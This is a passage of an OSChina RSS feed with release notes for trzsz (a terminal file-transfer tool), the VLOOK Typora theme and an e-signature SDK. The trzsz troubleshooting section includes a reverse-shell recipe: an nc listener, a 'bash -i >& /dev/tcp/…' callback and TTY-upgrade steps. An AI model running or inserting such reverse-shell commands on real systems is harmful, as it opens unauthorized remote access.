tmux</code><span>&nbsp;</span>这种场景，使用<span>&nbsp;</span><code>scp</code><span>&nbsp;</span>或<span>&nbsp;</span><code>sftp</code><span>&nbsp;</span>是不方便的。</p></li><li><p style="margin-left:0; margin-right:0">在这种场景下，使用<span>&nbsp;</span><code>lrzsz</code><span>&nbsp;</span>(rz /sz) 是很方便的，但是很可惜它与<span>&nbsp;</span><code>tmux</code><span>&nbsp;</span>不兼容。</p></li><li><p style="margin-left:0; margin-right:0"><code>tmux</code><span>&nbsp;</span>不打算支持 rz /sz (<span>&nbsp;</span><a href="https://gitee.com/link?target=https%3A%2F%2Fgithub.com%2Ftmux%2Ftmux%2Fissues%2F906">906</a>,<span>&nbsp;</span><a href="https://gitee.com/link?target=https%3A%2F%2Fgithub.com%2Ftmux%2Ftmux%2Fissues%2F1439">1439</a><span>&nbsp;</span>)，于是就开发了<span>&nbsp;</span><code>trzsz</code><span>&nbsp;</span>( trz / tsz )。</p></li></ul><h2>优点介绍</h2><ul><li>支持<span>&nbsp;</span><strong>tmux</strong>，包括 tmux 普通模式，以及与 iTerm2 集成的 tmux 命令模式。</li><li>支持<span>&nbsp;</span><strong>传输目录</strong>，<code>trz -d</code><span>&nbsp;</span>命令上传目录，<code>tsz -d xxx</code><span>&nbsp;</span>命令下载 xxx 目录。</li><li>支持<span>&nbsp;</span><strong>断点续传</strong>，<code>trz -y</code><span>&nbsp;</span>或<span>&nbsp;</span><code>tsz -y xxx</code><span>&nbsp;</span>覆盖目标文件会自动进行断点续传。</li><li>支持<span>&nbsp;</span><strong>Windows</strong>，不仅可在 Windows 客户端使用，也可在 Windows ssh 服务器使用。</li><li>支持<span>&nbsp;</span><strong>原生终端</strong>，不需要原生终端做支持，只要使用<span>&nbsp;</span><code>trzsz ssh x.x.x.x</code><span>&nbsp;</span>登录即可。</li><li>支持<span>&nbsp;</span><strong>web 终端</strong>，通过 web 浏览器在本地与服务器之间传输目录和文件。</li><li>支持<span>&nbsp;</span><strong>拖动上传</strong>，将文件和目录拖到终端窗口即可上传到远程服务器。</li><li>支持<span>&nbsp;</span><strong>进度条</strong>，显示当前正在传输的文件名、进度、大小、速度和剩余时间等。</li><li>更好的<span>&nbsp;</span><strong>交互体验</strong>，传输成功或出错时显示友好的结果，<code>ctrl + c</code><span>&nbsp;</span>优雅中止。</li></ul><h2>安装指南</h2><h3>在远程服务器上安装</h3><ul><li><p style="margin-left:0; margin-right:0">安装<span>&nbsp;</span><a href="https://gitee.com/link?target=https%3A%2F%2Fgithub.com%2Ftrzsz%2Ftrzsz-go">用 Go 实现的版本</a>（ ⭐ 推荐 ）</p><p style="margin-left:0; margin-right:0">请查看 Go 版安装指引：<a href="https://gitee.com/link?target=https%3A%2F%2Ftrzsz.github.io%2Fcn%2Fgo">https://trzsz.github.io/cn/go</a></p></li><li><p style="margin-left:0; margin-right:0">或者用 Python3 安装</p><div><div><pre><span>sudo python3 -m pip <span style="color:#d73a49">install</span><span style="color:#6a737d">--upgrade trzsz</span></span></pre><div>
     &nbsp;
    </div></div></div></li><li><p style="margin-left:0; margin-right:0">或者用 Python2 安装</p><div><div><pre><span>sudo python2 -m pip <span style="color:#d73a49">install</span><span style="color:#6a737d">--upgrade trzsz</span></span></pre><div>
     &nbsp;
    </div></div></div></li><li><p style="margin-left:0; margin-right:0">或者用 Homebrew 安装</p><div><div><pre><span><span style="color:#6f42c1">brew</span><span style="color:#032f62">update</span></span><span><span style="color:#6f42c1">brew</span><span style="color:#032f62">install trzsz</span></span></pre><div>
     &nbsp;
    </div></div></div></li><li><p style="margin-left:0; margin-right:0">或者用 Node.js 安装</p><div><div><pre><span><span style="color:#6f42c1">sudo</span><span style="color:#032f62">npm install -g trzsz</span></span></pre><div>
     &nbsp;
    </div></div></div></li></ul><p style="color:#40485b; margin-left:0; margin-right:0; text-align:left">&nbsp;&nbsp;没有<span>&nbsp;</span><code>sudo</code><span>&nbsp;</span>权限也可以安装，只要将安装路径 ( 可能是<span>&nbsp;</span><code>~/.local/bin</code><span>&nbsp;</span>) 添加到<span>&nbsp;</span><code>PATH</code><span>&nbsp;</span>环境变量中即可。</p><h3>支持的终端</h3><ul><li><p style="margin-left:0; margin-right:0"><a href="https://gitee.com/link?target=https%3A%2F%2Ftrzsz.github.io%2Fcn%2Fssh">trzsz-ssh</a><span>&nbsp;</span>(tssh) -- 内置支持 trzsz 的 ssh 客户端（ ⭐ 推荐 ）。</p></li><li><p style="margin-left:0; margin-right:0"><a href="https://gitee.com/link?target=https%3A%2F%2Fiterm2.com%2F">iTerm2</a><span>&nbsp;</span>-- 参考<span>&nbsp;</span><a href="https://gitee.com/trzsz/trzsz/blob/master/iterm2.md">Trzsz-iTerm2 安装文档</a>。</p></li><li><p style="margin-left:0; margin-right:0"><a href="https://gitee.com/link?target=https%3A%2F%2Ftabby.sh%2F">tabby</a><span>&nbsp;</span>-- 安装<span>&nbsp;</span><a href="https://gitee.com/link?target=https%3A%2F%2Fgithub.com%2Ftrzsz%2Ftabby-trzsz">tabby-trzsz</a><span>&nbsp;</span>插件即可。</p></li><li><p style="margin-left:0; margin-right:0"><a href="https://gitee.com/link?target=https%3A%2F%2Felecterm.github.io%2Felecterm%2F">electerm</a><span>&nbsp;</span>-- 升级到<span>&nbsp;</span><code>1.19.0</code><span>&nbsp;</span>以上的版本即可。</p></li><li><p style="margin-left:0; margin-right:0"><a href="https://gitee.com/link?target=https%3A%2F%2Fgithub.com%2Ftsl0922%2Fttyd">ttyd</a><span>&nbsp;</span>-- 升级到<span>&nbsp;</span><code>1.7.3</code><span>&nbsp;</span>以上的版本，并且启动时加上<span>&nbsp;</span><code>-t enableTrzsz=true</code>，非 localhost 要用<span>&nbsp;</span><code>https</code>。</p></li><li><p style="margin-left:0; margin-right:0"><a href="https://gitee.com/link?target=https%3A%2F%2Ftrzsz.github.io%2Fcn%2Fgo">trzsz-go</a><span>&nbsp;</span>-- 只要是支持本地 shell 的终端就可以用。</p></li><li><p style="margin-left:0; margin-right:0"><a href="https://gitee.com/link?target=https%3A%2F%2Ftrzsz.github.io%2Fcn%2Fjs">trzsz.js</a><span>&nbsp;</span>-- 让运行在浏览器中的 webshell 和用 electron 开发的终端支持<span>&nbsp;</span><code>trzsz</code>。</p></li></ul><p style="color:#40485b; margin-left:0; margin-right:0; text-align:left">&nbsp;&nbsp;<em>如果你的终端也支持<span>&nbsp;</span><code>trzsz</code>，请告诉我，我很乐意将它加到此列表中。</em></p><h2>使用指南</h2><h4><code>trz</code><span>&nbsp;</span>上传文件</h4><p style="color:#40485b; margin-left:0; margin-right:0; text-align:left"><code>trz</code><span>&nbsp;</span>命令可以不带任何参数，将上传文件到当前目录。也可以带一个目录参数，指定上传到哪个目录。</p><div><div><pre><span><span style="color:#6f42c1">trz</span><span style="color:#032f62">/tmp/</span></span></pre><div>
   &nbsp;
  </div></div></div><h4><code>tsz</code><span>&nbsp;</span>下载文件</h4><p style="color:#40485b; margin-left:0; margin-right:0; text-align:left"><code>tsz</code><span>&nbsp;</span>可以带一个或多个文件名（可使用相对路径或绝对路径，也可使用通配符），将下载指定的文件。</p><div><div><pre><span><span style="color:#6f42c1">tsz</span><span style="color:#032f62">file1 file2 file3</span></span></pre><div>
   &nbsp;
  </div></div></div><h4><code>-q</code><span>&nbsp;</span>静默模式</h4><p style="color:#40485b; margin-left:0; margin-right:0; text-align:left"><code>trz -q</code><span>&nbsp;</span>或<span>&nbsp;</span><code>tsz -q xxx</code><span>&nbsp;</span>( 加上<span>&nbsp;</span><code>-q</code><span>&nbsp;</span>选项 )，则在传输文件时不显示进度条。</p><h4><code>-y</code><span>&nbsp;</span>覆盖模式</h4><p style="color:#40485b; margin-left:0; margin-right:0; text-align:left"><code>trz -y</code><span>&nbsp;</span>或<span>&nbsp;</span><code>tsz -y xxx</code><span>&nbsp;</span>( 加上<span>&nbsp;</span><code>-y</code><span>&nbsp;</span>选项 )，如果存在相同文件名的文件就直接覆盖，并支持断点续传。</p><h4><code>-b</code><span>&nbsp;</span>二进制模式</h4><p style="color:#40485b; margin-left:0; margin-right:0; text-align:left"><code>trz -b</code><span>&nbsp;</span>或<span>&nbsp;</span><code>tsz -b xxx</code><span>&nbsp;</span>( 加上<span>&nbsp;</span><code>-b</code><span>&nbsp;</span>选项 )，二进制传输模式，对于压缩包、图片、影音等较快。</p><h4><code>-e</code><span>&nbsp;</span>转义控制字符</h4><p style="color:#40485b; margin-left:0; margin-right:0; text-align:left">二进制模式时，控制字符可能会导致失败，<code>trz -eb</code><span>&nbsp;</span>或<span>&nbsp;</span><code>tsz -eb xxx</code><span>&nbsp;</span>( 加上<span>&nbsp;</span><code>-e</code><span>&nbsp;</span>选项 ) 转义所有已知的控制字符。</p><h4><code>-d</code><span>&nbsp;</span>/<span>&nbsp;</span><code>-r</code><span>&nbsp;</span>传输文件夹</h4><p style="color:#40485b; margin-left:0; margin-right:0; text-align:left"><code>trz -d</code><span>&nbsp;</span>或<span>&nbsp;</span><code>tsz -r xxx</code><span>&nbsp;</span>( 加上<span>&nbsp;</span><code>-d</code><span>&nbsp;</span>或<span>&nbsp;</span><code>-r</code><span>&nbsp;</span>选项 )，则可以上传或下载指定文件夹和文件。</p><h4><code>-B</code><span>&nbsp;</span>缓冲区上限</h4><p style="color:#40485b; margin-left:0; margin-right:0; text-align:left"><code>trz -B 20m</code><span>&nbsp;</span>或<span>&nbsp;</span><code>tsz -B 2M xxx</code><span>&nbsp;</span>等，设置最大缓冲区上限 (默认 10M)。会自动根据网速选择合适的缓冲区大小，但不会超过此上限。</p><h4><code>-t</code><span>&nbsp;</span>超时时间</h4><p style="color:#40485b; margin-left:0; margin-right:0; text-align:left"><code>trz -t 30</code><span>&nbsp;</span>或<span>&nbsp;</span><code>tsz -t 30 xxx</code><span>&nbsp;</span>等，设置超时秒数 (默认 20 秒)。在超时时间内，如果无法传完一个缓冲区大小的数据则会报错并退出。设置为 0 或负数，则永不超时。</p><h4>异常处理方法</h4><ul><li><p style="margin-left:0; margin-right:0">如果<span>&nbsp;</span><code>tmux</code><span>&nbsp;</span>是运行在本地电脑上。</p><ul><li>方案 1：使用<span>&nbsp;</span><code>tmux -CC</code><span>&nbsp;</span>与 iTerm2 集成，请参考<span>&nbsp;</span><a href="https://gitee.com/trzsz/trzsz/blob/master/tmuxcc.md">iTerm2 与 tmux -CC 集成</a>。</li><li>方案 2：在本地电脑上安装<span>&nbsp;</span><a href="https://gitee.com/link?target=https%3A%2F%2Ftrzsz.github.io%2Fcn%2Fgo">trzsz-go</a>，在<span>&nbsp;</span><code>tmux</code><span>&nbsp;</span>之后用<span>&nbsp;</span><code>trzsz ssh</code><span>&nbsp;</span>登录。</li><li>方案 3：在本地电脑上安装<span>&nbsp;</span><a href="https://gitee.com/link?target=https%3A%2F%2Ftrzsz.github.io%2Fcn%2Fssh">trzsz-ssh</a>，在<span>&nbsp;</span><code>tmux</code><span>&nbsp;</span>之后用<span>&nbsp;</span><code>tssh</code><span>&nbsp;</span>登录。</li></ul></li><li><p style="margin-left:0; margin-right:0">如果<span>&nbsp;</span><code>tmux</code><span>&nbsp;</span>是运行在跳板机上。</p><ul><li>方案 1：使用<span>&nbsp;</span><code>tmux -CC</code><span>&nbsp;</span>与 iTerm2 集成，请参考<span>&nbsp;</span><a href="https://gitee.com/trzsz/trzsz/blob/master/tmuxcc.md">iTerm2 与 tmux -CC 集成</a>。</li><li>方案 2：在跳板机上安装<span>&nbsp;</span><a href="https://gitee.com/link?target=https%3A%2F%2Ftrzsz.github.io%2Fcn%2Fgo">trzsz-go</a>，在<span>&nbsp;</span><code>tmux</code><span>&nbsp;</span>之后用<span>&nbsp;</span><code>trzsz -r ssh</code><span>&nbsp;</span>登录。</li><li>方案 3：在跳板机上安装<span>&nbsp;</span><a href="https://gitee.com/link?target=https%3A%2F%2Ftrzsz.github.io%2Fcn%2Fssh">trzsz-ssh</a>，在<span>&nbsp;</span><code>tmux</code><span>&nbsp;</span>之后用<span>&nbsp;</span><code>tssh</code><span>&nbsp;</span>登录。</li></ul></li><li><p style="margin-left:0; margin-right:0">如果出现了错误，且<span>&nbsp;</span><code>trzsz</code><span>&nbsp;</span>挂住不能动了：</p><ul><li>按组合键<span>&nbsp;</span><code>control + c</code><span>&nbsp;</span>可以停止服务器上的<span>&nbsp;</span><code>trz</code><span>&nbsp;</span>或<span>&nbsp;</span><code>tsz</code><span>&nbsp;</span>进程。</li><li>对于 iTerm2 用户，按组合键<span>&nbsp;</span><code>command + option + shift + r</code><span>&nbsp;</span>可以停止<span>&nbsp;</span><a href="https://gitee.com/link?target=https%3A%2F%2Fiterm2.com%2Fdocumentation-coprocesses.html">iTerm2 Coprocesses</a>。</li></ul></li><li><p style="margin-left:0; margin-right:0">如果<span>&nbsp;</span><code>trz -b</code><span>&nbsp;</span>二进制上传失败，并且登录远程服务器时使用了<span>&nbsp;</span><code>telnet</code><span>&nbsp;</span>或<span>&nbsp;</span><code>docker exec</code>：</p><ul><li>可以试试转义所有控制字符，例如<span>&nbsp;</span><code>trz -eb</code>。</li></ul></li><li><p style="margin-left:0; margin-right:0">如果<span>&nbsp;</span><code>trz -b</code><span>&nbsp;</span>或<span>&nbsp;</span><code>tsz -b</code><span>&nbsp;</span>二进制传输失败，并且登录远程服务器时使用了<span>&nbsp;</span><code>expect</code>：</p><ul><li>可以试试在<span>&nbsp;</span><code>expect</code><span>&nbsp;</span>脚本前设置环境变量<span>&nbsp;</span><code>export LC_CTYPE=C</code>，例如： 
    <div><div><pre><span><span style="color:#6a737d">#!/bin/sh</span></span><span><span>export</span> LC_CTYPE=C</span><span>expect -c <span style="color:#032f62">'</span></span><span style="color:#032f62"></span><span><span style="color:#032f62">  spawn ssh xxx</span></span><span style="color:#032f62"></span><span><span style="color:#032f62">  expect "xxx: "</span></span><span style="color:#032f62"></span><span><span style="color:#032f62">  send "xxx\n"</span></span><span style="color:#032f62"></span><span><span style="color:#032f62">  interact</span></span><span style="color:#032f62"></span><span><span style="color:#032f62">'</span></span></pre><div>
       &nbsp;
      </div></div></div></li></ul></li><li><p style="margin-left:0; margin-right:0">如果想在反弹 shell 中使用<span>&nbsp;</span><code>trz / tsz</code><span>&nbsp;</span>上传和下载，则需要按以下步骤操作：</p><ul><li>1. 使用<span>&nbsp;</span><code>tssh xxx</code><span>&nbsp;</span>或<span>&nbsp;</span><code>trzsz ssh xxx</code><span>&nbsp;</span>登录服务器。</li><li>2. 在服务器上执行<span>&nbsp;</span><code>nc -lnv 1337</code>，等待反弹 shell 连接。</li><li>3. 在目标机器反弹连接到服务器，如<span>&nbsp;</span><code>bash -i &gt;&amp; /dev/tcp/192.168.0.1/1337 0&gt;&amp;1</code>。</li><li>4. 以下在反弹 shell 中操作： 
    <ul><li>4.1. 转换成交互式 shell，如<span>&nbsp;</span><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code>。</li><li>4.2. 按下<span>&nbsp;</span><code>ctrl + z</code><span>&nbsp;</span>将反弹 shell 转入后台运行。</li><li>4.3. 执行<span>&nbsp;</span><code>stty raw -echo; fg</code><span>&nbsp;</span>屏蔽服务器的回显，并将反弹 shell 转到前台运行。</li><li>4.4. 此时按一次回车键，就会显示命令行提示符等了。</li><li>4.5. 设置终端环境变量<span>&nbsp;</span><code>export TERM=xterm-256color</code>（ 此步骤非必须 ）。</li><li>4.6. 检查是否存在<span>&nbsp;</span><code>TMUX</code><span>&nbsp;</span>环境变更，若存在则要清掉<span>&nbsp;</span><code>unset TMUX</code>。</li><li>4.7. 此时就可以正常使用<span>&nbsp;</span><code>trz / tsz</code><span>&nbsp;</span>上传和下载了。</li></ul></li><li>5. 退出交互式 shell 后，输入的字符将不会回显，盲打<span>&nbsp;</span><code>exit</code><span>&nbsp;</span>退出反弹 shell。</li><li>6. 此时在服务器上盲打<span>&nbsp;</span><code>reset</code><span>&nbsp;</span>并回车，恢复终端的默认设置，然后回显就恢复正常了。</li></ul></li></ul><h2>屏幕截图</h2><h4>trzsz 在 iTerm2 中 text 进度条示例</h4><p style="color:#40485b; margin-left:0; margin-right:0; text-align:left"><img alt="using trzsz in iTerm2 with text progress bar" src="https://gitee.com/trzsz/trzsz/raw/master/screen-shot/iterm2_text.gif" referrerpolicy="no-referrer"></p><h4>trzsz 在 iTerm2 中 zenity 进度条示例</h4><p style="color:#40485b; margin-left:0; margin-right:0; text-align:left"><img alt="using trzsz in iTerm2 with zenity progress bar" src="https://gitee.com/trzsz/trzsz/raw/master/screen-shot/iterm2_zenity.gif" referrerpolicy="no-referrer"></p><h4>trzsz 在 tabby 中 tabby-trzsz 插件示例</h4><p style="color:#40485b; margin-left:0; margin-right:0; text-align:left"><img alt="using trzsz in tabby with tabby-trzsz plugin" src="https://gitee.com/trzsz/trzsz/raw/master/screen-shot/tabby_trzsz.gif" referrerpolicy="no-referrer"></p></div>
                                    ]]>
            </description>
            <pubDate>Mon, 22 Jan 2024 05:36:00 GMT</pubDate>
            <guid isPermaLink="false">https://www.oschina.net/news/276346/python-trzsz-1-1-5-released</guid>
            <link>https://www.oschina.net/news/276346/python-trzsz-1-1-5-released</link>
            <author>
                <![CDATA[来源: 投稿]]>
            </author>
        </item>
        <item>
            <title>
                <![CDATA[VLOOK 22！上新 GitHubStyleAlert/图片魔法/分享 OG，Markdown 主题插件]]>
            </title>
            <description>
                <![CDATA[<div class="content"><blockquote><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><strong>VLOOK™</strong><span><span>&nbsp;</span></span>是针对<span><span><span>&nbsp;</span></span></span><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftypora.io%2F" target="_blank">Typora</a>（跨平台 Markdown 编辑器）的<span><span>&nbsp;</span></span><strong>主题包</strong><span><span>&nbsp;</span></span>和<span><span>&nbsp;</span></span><strong>增强插件</strong>（针对导出的 HTML 文件)，<strong>旨在与众 Markdown 粉共创 Markdown 的自动化排版 2.0，在保持 Markdown 简洁性的基础上，让编辑、阅读 Markdown 文档更实用，也更愉悦。</strong></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><strong>VLOOK™</strong><span><span>&nbsp;</span></span>属于开源软件（遵从<span><span>&nbsp;</span></span><strong>MIT License</strong>），也是<span><span><span>&nbsp;</span></span></span><strong><a href="https://www.oschina.net/p/vlook">OSCHINA 开源中国</a></strong><span><span>&nbsp;</span></span>推荐的国产开源产品、Typora 的首个增强插件。</p></blockquote><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><strong>VLOOK™ 的所有特性清单，详见快速入坑 →<span><span>&nbsp;</span></span><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fmadmaxchow.github.io%2FVLOOK%2Findex.html%23%E5%BF%AB%E9%80%9F%E5%85%A5%E5%9D%91" target="_blank"><span>一键了解</span></a><span><span>&nbsp;</span></span>（<a href="https://madmaxchow.gitee.io/vlook/index.html#%E5%BF%AB%E9%80%9F%E5%85%A5%E5%9D%91">备用链接</a>）</strong></p><p style="color:#1f2328; text-align:start"><strong>（本次更新涉及的新特性 GitHub Style Alert，Typora 须升级至<span>&nbsp;</span><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftyporaio.cn%2Freleases%2Fall" target="_blank">1.8.3-dev</a><span>&nbsp;</span>或更新版本）</strong></p><h2>🎉 — What's NEW — 🎉</h2><h3>🎉 抢鲜体验 GitHub Style Alert</h3><ul><li>所有 VLOOK™ 主题均针对 GitHub Style Alert 进行了适配优化，且在编辑时即可预览效果，导出 HTML 后提示文本适配多语种；</li><li>提供了三种样式（常规/扁平/强调），可通过主题私人定制任意指定<span>&nbsp;</span><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fmadmaxchow.github.io%2FVLOOK%2Fguide.html%23github-style-alert" target="_blank">…详细</a></li></ul><p><img height="1008" src="https://oscimg.oschina.net/oscnet/up-35019bdd42e88a2aa51ca5984bd4fc25f28.png" width="2814" referrerpolicy="no-referrer"></p><h3>🎉 图片#魔法上新</h3><ul><li><p>支持按宽度<span>&nbsp;</span><code>w</code>、按高度<span>&nbsp;</span><code>h</code>，或同时指定宽度和高度进行缩放<span>&nbsp;</span><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fmadmaxchow.github.io%2FVLOOK%2Fguide.html%23%25E5%259B%25BE%25E7%2589%2587%25E7%25BC%25A9%25E6%2594%25BE" target="_blank">…详细</a></p></li><li><p>明信片支持添加边框样式，对白底图片的明信片「更友好」<span>&nbsp;</span><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fmadmaxchow.github.io%2FVLOOK%2Fguide.html%23%25E6%2598%258E%25E4%25BF%25A1%25E7%2589%2587" target="_blank">…详细</a></p></li></ul><p><img height="406" src="https://oscimg.oschina.net/oscnet/up-2f333ad8578c713cfc558d86015a5a32327.png" width="1516" referrerpolicy="no-referrer"></p><h3>🎉 支持 Open Graph Protocol</h3><p style="color:#1f2328; text-align:start">更好地适配分享到社交平台后的样式<span>&nbsp;</span><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fmadmaxchow.github.io%2FVLOOK%2Fguide2.html%23open-graph-protocol" target="_blank">…详细</a></p><hr><h2>♻️ — What's IMPROVED — ♻️</h2><p style="color:#1f2328; text-align:start"><strong>♻️ 主题适配优化</strong></p><ul><li>Typora 编辑时的引用小标题、折叠引用、分栏列表/引用的格式提示样式</li><li>引入更自然平滑的阴影渐变样式</li><li>表格列格式（百分数）的进度条颜色适配为主题色</li><li>调校参数<span>&nbsp;</span><code>quote</code><span>&nbsp;</span>支持不对默认引用块转换为彩虹引用块</li><li>题注编号颜色适配为主题色，代码块行号取消使用主题色</li></ul><p style="color:#1f2328; text-align:start"><strong>♻️ 其他优化</strong></p><ul><li>重构并简化长内容折叠与样式，并正确识别支持有指定<span>&nbsp;</span><code>srcset</code><span>&nbsp;</span>的情况</li><li>优化引用分栏在小屏时的高度自动适配</li><li>用不同图标区分文库页面的打开方式</li><li>主题样式调整</li></ul><h2>⚠️<span>&nbsp;</span>— What's CHANGED —<span>&nbsp;</span>⚠️</h2><ul><li>取消紧跟插图、表格、代码块后的引用块微调样式</li><li>取消图片缩放的<span>&nbsp;</span><code>px</code><span>&nbsp;</span>单位，改用<span>&nbsp;</span><code>w</code><span>&nbsp;</span><code>h</code></li><li>取消对引用块、详情块内的长内容（表格/插图/代码块）进行折叠</li><li>移除表格列格式对整列下划线、删除线的支持</li></ul><h2>🧯— What's FIXED — 🧯</h2><ul><li>修复表格含标签/徽章内容时，复制为 Markdown 格式的问题</li><li>修复列表分栏的标题样式右侧空缺的问题</li><li>修复部分示例文档乱码问题</li><li>修复启用反色的图片链接，在文档内切换为 Dark 后鼠标悬停样式问题</li><li>修复非 SVG 格式插图背景大小问题</li></ul></div>
                                    ]]>
            </description>
            <pubDate>Mon, 22 Jan 2024 03:41:00 GMT</pubDate>
            <guid isPermaLink="false">https://www.oschina.net/news/276336/vlook-22-released</guid>
            <link>https://www.oschina.net/news/276336/vlook-22-released</link>
            <author>
                <![CDATA[来源: 投稿]]>
            </author>
        </item>
        <item>
            <title>
                <![CDATA[开放签电子签章工具版升级至 1.1 版本，解决跨平台、跨语言集成使用问题]]>
            </title>
            <description>
                <![CDATA[<div class="content"><p style="margin-left:.0001pt; margin-right:0; text-align:justify"><span><span><span><span><span><span><span>本周开放签开源工具版增加了 SDK 与 API 能力，更新至 1.1 版本，使开放签电子签章工具能力进一步提升。SDK 将便于 java 用户直接使用 CA 证书颁发和签名能力。API 接口采用 HTTP</span></span></span><span><span><span>(S)</span></span></span><span><span><span>通讯</span></span></span><span><span><span>，</span></span></span><span><span><span>JSON 报文格式，具有跨平台、跨语言特性，专为各类开发语言用户提供服务，便于其他语言的开发者快速集成和应用电子签名。开发者可从开放签开源社区下载自行部署使用。</span></span></span></span></span></span></span></p><p style="margin-left:.0001pt; margin-right:0; text-align:justify"><span><span><span><span><strong><span><span><span><strong>具体</strong></span></span></span></strong><strong><span><span><span><strong>更新内容如下：</strong></span></span></span></strong></span></span></span></span></p><p style="margin-left:.0001pt; margin-right:0; text-align:justify"><span><span><strong><span><span><strong>一、API 集成能力</strong></span></span></strong></span></span></p><p style="margin-left:.0001pt; margin-right:0; text-align:justify"><span><span><span><span><strong><span><span><span><strong>1、通过 API 签发数字证书接口</strong></span></span></span></strong></span></span></span></span></p><ol><li><span><span><span><span><span><span><span>接口说明</span></span></span></span></span></span></span></li></ol><p style="margin-left:.0001pt; margin-right:0; text-align:justify"><span><span><span><span><span><span><span>数字证书是对电子文件进行数字签名的基础，也是签名用户的身份体现。开发者可通过调用签发数字证书接口签发数字证书。</span></span></span></span></span></span></span></p><ol><li><span><span><span><span><span><span><span>调用流程</span></span></span></span></span></span></span></li></ol><p><img height="720" src="https://oscimg.oschina.net/oscnet/up-ee750e689558aa2ce92b2a6348ccfbebade.png" width="1163" referrerpolicy="no-referrer"></p><ol><li><span><span><span><span><span><span><span>注意事项</span></span></span></span></span></span></span></li></ol><ol><li><span><span><span><span><span><span><span>所有证书主体（个人/企业）须先完成实名认证，只有完成实名认证的个人/企业才能为其签发证书，否则存在证书签发的法律风险！证书主体的身份真实性由服务调用方负责验证。</span></span></span></span></span></span></span></li><li><span><span><span><span><span><span><span>在文件签署环节，客户自有业务系统应明确告知签署人数字证书相关的使用协议，同时，在文件签署时，须获得签署人授权，完成签署人的意愿校验；</span></span></span></span></span></span></span></li><li><span><span><span><span><span><span><span>系统应保留文件签署的完整证据链，包括签署主体的实名认证记录、证书签发记录、签署记录、签署主体的意愿校验记录等。</span></span></span></span></span></span></span></li></ol><p style="margin-left:.0001pt; margin-right:0; text-align:justify"><span><span><span><span><strong><span><span><span><strong>2、PDF 文件签署接口</strong></span></span></span></strong></span></span></span></span></p><ol><li><span><span><span><span><span><span><span>接口说明</span></span></span></span></span></span></span></li></ol><p style="margin-left:.0001pt; margin-right:0; text-align:justify"><span><span><span><span><span><span><span>文件签署提供了对 PDF 格式的文件进行电子签名，接口属于本地化调用接口，不会将签署相关的信息发送到开放签云平台。</span></span></span></span></span></span></span></p><p style="margin-left:.0001pt; margin-right:0; text-align:justify"><span><span><span><span><span><span><span>目前支持的签署位置方式包括：关键字签署、指定签署位置签署；</span></span></span></span></span></span></span></p><ol><li><span><span><span><span><span><span><span>关键字签署：在文档中查找对应关键字的位置进行签署，若关键字在文件中存在多个，则在多处关键字位置上均会进行签名。</span></span></span></span></span></span></span></li><li><span><span><span><span><span><span><span>指定位置签署：在文档的指定位置进行签名。</span></span></span></span></span></span></span></li><li><span><span><span><span><span><span><span>签署位置计算示例</span></span></span></span></span></span></span></li></ol><p><img height="1021" src="https://oscimg.oschina.net/oscnet/up-de93daf405d983b5c5a62ded6f1e6a3c785.png" width="720" referrerpolicy="no-referrer"></p><ol><li><span><span><span><span><span><span><span>调用流程</span></span></span></span></span></span></span></li></ol><p><img height="720" src="https://oscimg.oschina.net/oscnet/up-c0d0096fb3d76a1b070496be6be75147d6a.png" width="784" referrerpolicy="no-referrer"></p><ol><li><span><span><span><span><span><span><span>注意事项：</span></span></span></span></span></span></span></li></ol><ol><li><span><span><span><span><span><span><span>目前支持的签名算法：RSA；</span></span></span></span></span></span></span></li><li><span><span><span><span><span><span><span>签署文件类型：PDF 文件；</span></span></span></span></span></span></span></li></ol><p style="margin-left:.0001pt; margin-right:0; text-align:justify"><span><span><strong><span><span><strong>3、企业印章图片生成接口</strong></span></span></strong></span></span></p><ol><li><span><span><span><span><span><span><span>接口说明</span></span></span><span><span><span>：</span></span></span><span><span><span>企业印章图片生成包括：1. 支持企业圆章的制作；2. 印章样式。&nbsp;</span></span></span></span></span></span></span></li><li><span><span><span><span><span><span><span>注意事项</span></span></span></span></span></span></span></li></ol><ol><li><span><span><span><span><span><span><span>程序生成的印章图片不具备法律效力，需结合正规 CA 机构签发的数字证书与严谨的数字证书使用授权机制才能具备法律效力。</span></span></span></span></span></span></span></li></ol><p style="margin-left:.0001pt; margin-right:0; text-align:justify"><span><span><strong><span><span><strong>二、JAVA-SDK 集成能力</strong></span></span></strong></span></span></p><p style="margin-left:.0001pt; margin-right:0; text-align:justify"><span><span><span><span><span><span><span>SDK 目前支持 java 版本，如使用非 java 语言，请使用开放签开源工具版 API 服务。SDK 提供了与 API 同等服务能力，包括：数字证书签发、PDF 文件签署、印章制作。开发者直接引入 jar 即可快速使用。</span></span></span></span></span></span></span></p><p style="margin-left:.0001pt; margin-right:0; text-align:justify"><span><span><strong><span><span><strong>三、优化 PDF 编辑底层代码</strong></span></span></strong></span></span></p><p style="margin-left:.0001pt; margin-right:0; text-align:justify"><span><span><span><span><span><span><span>将第三方 PDF 编辑工具替换。从原来得 itext-pdf 替换为 pdfbox，解决潜在的版权风险问题，让开发者更加放心、无忧使用电子签章技术工具。</span></span></span></span></span></span></span></p><p style="margin-left:.0001pt; margin-right:0; text-align:justify"><span><span><strong><span><span><strong>开放签工具版未来版本更新计划如下：</strong></span></span></strong></span></span></p><ol><li><span><span><span><span><span><span><span>OFD 文件签署；</span></span></span></span></span></span></span></li><li><span><span><span><span><span><span><span>国密数字证书签发；</span></span></span></span></span></span></span></li><li><span><span><span><span><span><span><span>国密数字证书签署；</span></span></span></span></span></span></span></li><li><span><span><span><span><span><span><span>制作更多签章样式；</span></span></span></span></span></span></span></li><li><span><span><span><span><span><span><span>移动端签署;</span></span></span></span></span></span></span></li></ol></div>
                                    ]]>
            </description>
            <pubDate>Mon, 22 Jan 2024 02:48:00 GMT</pubDate>
            <guid isPermaLink="false">https://www.oschina.net/news/276328</guid>
            <link>https://www.oschina.net/news/276328</link>
            <author>
                <![CDATA[来源: 投稿]]>
            </author>
        </item>
        <item>
            <title>
